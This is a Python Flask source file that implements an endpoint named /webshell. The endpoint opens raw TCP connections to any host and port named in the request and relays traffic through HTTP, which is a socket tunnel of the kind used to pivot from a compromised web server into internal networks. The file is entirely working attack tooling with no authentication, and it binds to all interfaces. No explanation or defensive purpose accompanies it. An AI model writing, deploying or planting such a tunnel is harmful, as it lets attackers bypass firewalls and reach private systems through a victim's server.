from flask import Flask, request, make_response, g
import select

connmap = {}

app = Flask(__name__)

import socket

@app.route("/webshell", methods=['POST'])
def webshell():
    global connmap

    session_id = "session_%d" % int(request.args.get("id"))
    cmd = request.args.get("cmd")
    try:
        match cmd:
            case "CONNECT":
                sobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sobj.connect((request.args.get("host"), int(request.args.get("port"))))
                connmap[session_id] = sobj
                resp = make_response()
                resp.headers["X-STATE"] = "OK"
                return resp

            case "DISCONNECT":
                if session_id in connmap:
                    connmap[session_id].close()
                    del connmap[session_id]

            case "COMM":
                data = request.get_data()
                sent = 0
                while sent < len(data):
                    sent += connmap[session_id].send(data[sent:])

                ready = select.select([connmap[session_id]], [], [], 0.1)
                if ready[0]:
                    in_data = connmap[session_id].recv(1024)
                    if in_data is None:
                        resp = make_response(b"", 200)
                        resp.headers["X-STATE"] = "DISCONNECT"
                        return resp
                else:
                    in_data = b''
                resp = make_response(in_data)
                resp.headers["X-STATE"] = "OK"
                return resp

    except ConnectionAbortedError as e:
        print(e)
        resp = make_response(b"", 200)
        resp.headers['X-STATE'] = 'DISCONNECTED'
        resp.headers['X-EX'] = "ConnectionAbortedError"
        return resp
    except Exception as e:
        print("Unexpected error:", e)
        resp = make_response(b"", 200)
        resp.headers['X-STATE'] = 'FAILED'
        resp.headers['X-EX'] = str(e)

app.run(host='0.0.0.0', port=5000)